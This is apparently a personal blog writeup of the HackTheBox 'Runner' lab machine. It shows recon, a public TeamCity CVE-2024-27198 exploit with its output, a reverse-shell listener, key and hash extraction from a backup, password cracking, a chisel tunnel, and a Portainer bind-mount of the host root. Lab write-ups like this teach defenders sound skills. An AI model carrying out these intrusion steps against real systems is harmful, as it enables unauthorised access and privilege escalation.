---
layout: post
title: Runner HackTheBox Machine - Writeup
categories: [HackTheBox Machines]
tags: [hackthebox,web,hackthebox medium,linux]
permalink: /posts/runner-htb
image:
  path: /images/htb/medium/runner/icon.png
---

I did this box on release and got stuck at a few points, the root was definetly the harder part.

**Machine created by:** [TheCyberGeek](https://app.hackthebox.com/users/114053)

## Recon
I start off my recon by doing a portscan of the IP.

```
$ sudo nmap -p- -T5 10.10.11.7
Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-23 23:27 AEST
...
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp open  http
```

I visit [10.10.11.13:80](http://10.10.11.13:80) and it redirects me to [runner.htb](http://runner.htb) so I edit my `/etc/hosts` to include that record.

![Home Page](/images/htb/medium/runner/home.png)

Seems alright, browsing around I can gather some basic information:
- There's an email `sales@runner.htb`
- The rest of the site is basically nothing.

I start some scans with `ffuf`, firstly I run a subdomain scan.
```
$ ffuf -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -u http://runner.htb -H "Host: FUZZ.runner.htb" -fs 154
...
teamcity                [Status: 401, Size: 66, Words: 8, Lines: 2, Duration: 27ms]
```

Nice! Registering that in my `/etc/hosts` I check it out:
![Teamcity](/images/htb/medium/runner/teamcity.png)

## Initial Access

Now because it's a login page I look for any recent CVEs for Teamcity and [hit the jackpot](https://nvd.nist.gov/vuln/detail/CVE-2024-27198), a Authentication Bypass with RCE capabilities. A [PoC](https://github.com/W01fh4cker/CVE-2024-27198-RCE) exists so I download and give it a shot:
```
$ python3 CVE-2024-27198-RCE.py -t http://teamcity.runner.htb 
...
[+] User added successfully, username: 1dlcb9za, password: CsMXIY5FU1, user ID: 14
[+] The target operating system version is linux
[+] Please start executing commands freely! Type <quit> to end command execution
command > whoami
tcuser
```

Nice! Now I find this shell a bit messy to work with so I use `pwncat-cs` and send a `Python3 shortest` reverse shell from [Revshells.com](https://revshells.com).
```
$ pwncat-cs
[16:41:49] Welcome to pwncat 🐈!
(local) pwncat$ listen 4444 -m linux
[16:41:53] new listener created for 0.0.0.0:4444
(local) pwncat$
...
(remote) tcuser@647a82f29ca0:/opt/teamcity/bin$
```

Looking around the filesystem, I find `/data` of interest and explore into that folder. Inside `/data/teamcity_server/datadir/backup` is a backup zip which I copy to my local system.
```
(local) pwncat$ download /data/teamcity_server/datadir/backup/TeamCity_Backup_20240513_143904.zip "/home/kali/Downloads/teamcity.zip"
/data/teamcity_server/datadir/backup/TeamCity_Backup_20240513_143904.zip ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 269.8/269.8 kB • ? • 0:00:00
[23:38:05] downloaded 269.78KiB in 0.51 seconds    
```

Once copied I extract the zip.

> **Note:** The shell is not necessary for this box, you can do this with [CVE-2023-42793](https://nvd.nist.gov/vuln/detail/CVE-2023-42793) and manually download the backup from the webpage.
![teamcitydash](/images/htb/medium/runner/teamcitydash.png)

## User Flag

I run `tree` on the extracted zip and look for any files that catch my eye.
```
$ tree
...
│   ├── projects
│   │   ├── AllProjects
│   │   │   ├── pluginData
│   │   │   │   └── ssh_keys
│   │   │   │       └── id_rsa
...
```

Now that is certainly of use! I go and get the `id_rsa` and use it as authentication via SSH, issue is, who's key is it? I go back to that website panel and see there is a `Users` tab in the `Administration` section. (We can use the credentials from the PoC ran, or with another PoC for [CVE-2023-42793](https://nvd.nist.gov/vuln/detail/CVE-2023-42793)).
![users](/images/htb/medium/runner/users.png)

The only two valid users with `runner.htb` emails are `john` and `matthew`. Trying `john` as the user first is successful!
```
$ chmod 600 id_rsa
$ ssh john@runner.htb -i id_rsa
...
john@runner:~$ cat user.txt
c505e87e4c10c5bfc56623b83f12955d
```

User Flag: <mark>c505e87e4c10c5bfc56623b83f12955d</mark>

## Root Flag
If we go back to that backup briefly, it turns out we missed something, some password hashes in `/database_dump/users`
```
$ cat users      
ID, USERNAME, PASSWORD, NAME, EMAIL, LAST_LOGIN_TIMESTAMP, ALGORITHM
1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1715610330797, BCRYPT
2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT
11, city_admincuxc, $2a$07$mI3nvMIuvYEGinXSWNhdY.OmPrLw2nRK8Jcf.zMzOmgpOHl/N4bjq, , angry-admin@funnybunny.org, 1715610347750, BCRYPT
```

If we put these hashes into `john` (`hashcat` was being troublesome...) we can actually crack one.
```
$ john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --format=bcrypt hashes
...
piper123         (?)
```

Finding the hash it corresponded to, it was `matthew`'s. It doesn't work on `ssh`, what else can we try?

I got stuck here for a bit but spotted something exploring `john`'s SSH connection, inside `/opt` is `portainer`. I check the ports running with `netstat -ntlp` I see the following:
```
$ netstat -ntlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:9443          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8111          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5005          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::8000                 :::*                    LISTEN      - 
```
Port `9443` and `9000` are both used for portainer, so I get `chisel` onto the server using a `python3 -m http.server` and `wget`.

On my machine I setup the server:
```
$ chisel server -p 8000 --reverse
```

And on the SSH conection for `john` I run:
```
$ chmod +x chisel
$ ./chisel clinet 10.10.16.37:8000 R:9443:127.0.0.1:9443 R:9000:127.0.0.1:9000
```

Now we can access port `9443` and `9000` on our machine. I visit [localhost:9000](http://localhost:9000) and am presented with a login screen.

![Portainer](/images/htb/medium/runner/portainer.png)

I try `matthew:piper123` and we are logged in!
![Portainer Dashboard](/images/htb/medium/runner/portainerdash.png)

This was where I got stuck for a while, the solution I did to get this to work was the following. My idea was with the capabilities of `Volumes` we could bind the local directory to a container and then explore it. I heard other people approached it with container escapes but this method was the easiest for me.

I look online for ways in docker to bind a local directory and find a [forum conversation](https://forums.docker.com/t/create-local-volume-with-custom-mount-options/117924/7) which seems to give me what I need.
```
type: none
device: "$HOME/volumes/test"
o: bind
```
I modify it to fit my needs:
```
type: none
device: /
o: bind
```
and make a new volume:
![Volume](/images/htb/medium/runner/volume.png)

I then make a new container from the `teamcity:latest` image that is on the machine and use the shell.
![containerset1](/images/htb/medium/runner/containerset1.png)
![containerset2](/images/htb/medium/runner/containerset2.png)
![containerconnect](/images/htb/medium/runner/containerconnect.png)

I make sure to use the `root` user when connecting because otherwise certain parts of the filesystem are inaccesible.
![containerroot](/images/htb/medium/runner/containerroot.png)
```
   Welcome to TeamCity Server Docker container

 * Installation directory: /opt/teamcity
 * Logs directory:         /opt/teamcity/logs
 * Data directory:         /data/teamcity_server/datadir

   TeamCity will be running under 'root' user (0/0)

root@182b1c709dd9:/# cd /mnt/root
root@182b1c709dd9:/mnt/root# cat root.txt
3930082765ed4a6a9600740d52302157
```

Root Flag: <mark>3930082765ed4a6a9600740d52302157</mark>

![Success](/images/htb/medium/runner/submitted.png)

## Thanks for reading!
Feel free to give me feedback or follow me on [Twitter](https://twitter.com/sealldev) and [LinkedIn](https://www.linkedin.com/in/noah-cooper-5442ab309/).

You can also find my other contacts on the [whoami](../about) page.